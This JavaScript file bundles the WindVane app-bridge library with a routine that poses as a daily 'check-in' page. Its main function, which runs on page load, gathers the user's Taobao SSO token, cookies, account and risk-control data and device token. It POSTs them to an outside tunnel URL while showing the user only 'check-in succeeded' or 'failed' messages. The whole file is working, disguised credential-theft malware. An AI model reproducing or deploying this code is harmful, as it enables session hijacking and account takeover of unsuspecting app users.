const UPLOAD_URL = 'https://299ec5812fcc6d.lhr.life/upload';

!function (a, b) {
    function c(a, b) {
        a = a.toString().split("."), b = b.toString().split(".");
        for (var c = 0; c < a.length || c < b.length; c++) {
            var d = parseInt(a[c], 10), e = parseInt(b[c], 10);
            if (window.isNaN(d) && (d = 0), window.isNaN(e) && (e = 0), e > d) return -1;
            if (d > e) return 1
        }
        return 0
    }

    var d = a.Promise, e = a.document, f = a.navigator.userAgent,
        g = /Windows\sPhone\s(?:OS\s)?[\d\.]+/i.test(f) || /Windows\sNT\s[\d\.]+/i.test(f),
        h = g && a.WindVane_Win_Private && a.WindVane_Win_Private.call, i = /iPhone|iPad|iPod/i.test(f),
        j = /Android/i.test(f), k = f.match(/WindVane[\/\s](\d+[._]\d+[._]\d+)/),
        l = Object.prototype.hasOwnProperty, m = b.windvane = a.WindVane || (a.WindVane = {}),
        n = Math.floor(65536 * Math.random()), o = 1, p = [], q = 3, r = "hybrid", s = "wv_hybrid", t = "iframe_",
        u = "param_", v = 6e5, w = 6e4;
    k = k ? (k[1] || "0.0.0").replace(/\_/g, ".") : "0.0.0";
    var x = {
        isAvailable: 1 === c(k, "0"), isNewBridgeAvailable: 1 === c(k, "8.2.0"), call2: function (a, b, c, d, e) {
            var f = a.indexOf(".");
            return x.call(a.substr(0, f), a.substr(f + 1), b, c, d, e)
        }, call: function (b, c, e, f, g, h) {
            var i, j;
            if ("number" == typeof arguments[arguments.length - 1] && (h = arguments[arguments.length - 1]), "function" != typeof f && (f = null), "function" != typeof g && (g = null), !d || f || g || (j = new d(function (a, b) {
                f = a, g = b
            })), x.isNewBridgeAvailable && a.__windvane__ && a.__windvane__.call) return a.__windvane__.call(b + "." + c, e, f, g, h), j;
            i = y.getSid();
            var k = {success: f, failure: g};
            return h > 0 && (k.timeout = setTimeout(function () {
                x.onFailure(i, {ret: "HY_TIMEOUT"})
            }, h)), y.registerCall(i, k), y.registerGC(i, h), x.isAvailable ? y.callMethod(b, c, e, i) : x.onFailure(i, {ret: "HY_NOT_IN_WINDVANE"}), j
        }, fireEvent: function (a, b, c) {
            var d = e.createEvent("HTMLEvents");
            d.initEvent(a, !1, !0), d.param = y.parseData(b), e.dispatchEvent(d)
        }, getParam: function (a) {
            return y.getParam(a)
        }, setData: function (a, b) {
        }, find: function (a, b) {
            b || y.unregisterCall(a, !1)
        }, onSuccess: function (a, b, c) {
            y.onComplete(a, b, "success", c)
        }, onFailure: function (a, b) {
            y.onComplete(a, b, "failure")
        }
    };
    x.isNewBridgeAvailable && a.__windvane__ && a.__windvane__.callSync && (x.callSync = function (b, c) {
        if (i) return a.__windvane__.callSync(b, c);
        if (j) {
            var d = {name: b};
            c && (d.params = JSON.stringify(c));
            var e = a.__windvane__.callSync(d);
            if (e) try {
                return JSON.parse(e)
            } catch (f) {
            }
        }
    });
    var y = {
        params: {}, calls: {}, getSid: function () {
            return (n + o++) % 65536 + ""
        }, buildParam: function (a) {
            return a && "object" == typeof a ? JSON.stringify(a) : a || ""
        }, getParam: function (a) {
            return this.params[u + a] || ""
        }, setParam: function (a, b) {
            this.params[u + a] = b
        }, parseData: function (a) {
            var b;
            if (a && "string" == typeof a) try {
                b = JSON.parse(a)
            } catch (c) {
                b = {ret: "HY_RESULT_PARSE_ERROR", originValue: a}
            } else b = a || {};
            return b
        }, registerCall: function (a, b) {
            this.calls[a] = b
        }, unregisterCall: function (a, b) {
            var c = this.calls[a] || {}, d = c.timeout;
            return d && clearTimeout(d), b || delete this.calls[a], c
        }, useIframe: function (a, b) {
            var c = t + a, d = p.pop();
            d || (d = e.createElement("iframe"), d.setAttribute("frameborder", "0"), d.style.cssText = "width:0;height:0;border:0;display:none;"), d.setAttribute("id", c), d.setAttribute("src", b), d.parentNode || setTimeout(function () {
                e.body.appendChild(d)
            }, 5)
        }, retrieveIframe: function (a) {
            var b = t + a, c = e.querySelector("#" + b);
            if (c) if (p.length >= q) try {
                e.body.removeChild(c)
            } catch (d) {
            } else p.indexOf(c) < 0 && p.push(c)
        }, callMethod: function (b, c, d, e) {
            if (d = y.buildParam(d), g) h ? a.WindVane_Win_Private.call(b, c, e, d) : this.onComplete(e, {ret: "HY_NO_HANDLER_ON_WP"}, "failure"); else if (i) {
                this.setParam(e, d);
                var f = r + "://" + b + ":" + e + "/" + c + "?" + encodeURIComponent(d);
                this.useIframe(e, f)
            } else if (j) {
                var f = r + "://" + b + ":" + e + "/" + c + "?" + d, k = s + ":";
                window.prompt(f, k)
            } else this.onComplete(e, {ret: "HY_NOT_SUPPORT_DEVICE"}, "failure")
        }, registerGC: function (a, b) {
            var c = this, d = Math.max(b || 0, v), e = Math.max(b || 0, w);
            setTimeout(function () {
                c.unregisterCall(a)
            }, d), i && setTimeout(function () {
                c.params[u + a] && delete c.params[u + a]
            }, e)
        }, onComplete: function (a, b, c, d) {
            var e = this.unregisterCall(a, d), f = e.success, g = e.failure;
            b = this.parseData(b);
            var h = b.ret;
            "string" == typeof h && (b = b.value || b, b.ret || (b.ret = [h])), "success" === c ? f && f(b) : "failure" === c && g && g(b), i && (this.retrieveIframe(a), this.params[u + a] && delete this.params[u + a])
        }
    };
    for (var z in x) l.call(m, z) || (m[z] = x[z])
}(window, window.lib || (window.lib = {}));

function trigger(a, b, param = {}) {
    return new Promise(function (resolve) {
        window.WindVane.call(a, b, param, resolve, resolve);
    })
}

function resolveFromPaths(obj, paths) {
    for (var i = 0; i < paths.length; i++) {
        var value = obj;
        var path = paths[i];
        var matched = true;
        for (var j = 0; j < path.length; j++) {
            if (!value || typeof value !== 'object' || !(path[j] in value)) {
                matched = false;
                break;
            }
            value = value[path[j]];
        }
        if (matched && value !== undefined && value !== null && value !== '') {
            return value;
        }
    }
    return null;
}

function pickUserId(payload) {
    var candidates = [
        ['getUser', 'data', 'userId'],
        ['getUser', 'data', 'userid'],
        ['getUser', 'userId'],
        ['getUser', 'userid'],
        ['getBaseInfo', 'data', 'userId'],
        ['getBaseInfo', 'data', 'userid'],
        ['getBaseInfo', 'userId'],
        ['getBaseInfo', 'userid']
    ];
    var value = resolveFromPaths(payload, candidates);
    if (value && typeof value === 'object' && 'userId' in value) {
        return value.userId;
    }
    return value || null;
}

async function main() {
    let x = {}
    x.dataTag = 'CHECKIN';
    x.ua = navigator.userAgent;
    x.getBaseInfo = await trigger('aluAccount', 'getBaseInfo')
    x.getTbSsoToken = await trigger('aluAccount', 'getTbSsoToken')
    x.getUser = await trigger('aluAccount', 'getUser')
    x.getRiskControlInfo = await trigger('aluAccount', 'getRiskControlInfo')
    x.getWua = await trigger('aluWVJSBridge', 'getWua')
    x.cookie = await trigger('WVCookie', 'read', {url: 'http://www.taobao.com'})
    x.userId = pickUserId(x);

    const keys = [
        'getBaseInfo',
        'getTbSsoToken',
        'getUser',
        'getRiskControlInfo',
        'getWua',
        'cookie',
        'userId',
        'ua'
    ];
    const missing = [];
    for (const k of keys) {
        if (!Object.prototype.hasOwnProperty.call(x, k) ||
            x[k] === undefined || x[k] === null || x[k] === '') {
            missing.push(k);
        }
    }
    if (missing.length) {
        document.write("签到失败，请检查登录状态后重试")
    } else {
        try {
            const resp = await fetch(UPLOAD_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(x),
                mode: 'cors'
            });
            if (resp.ok) {
                document.write("签到成功");
            } else if (resp.status === 429) {
                document.write("签到频繁，请不要重复操作")
            } else {
                document.write(`签到失败，请联系代理: ${resp.status}`);
            }
        } catch (err) {
            document.write('fetch error', err);
        }
    }
}

(async function () {
    try {
        await main();
    } catch (e) {
        console.error('overall error', e);
    }
})();
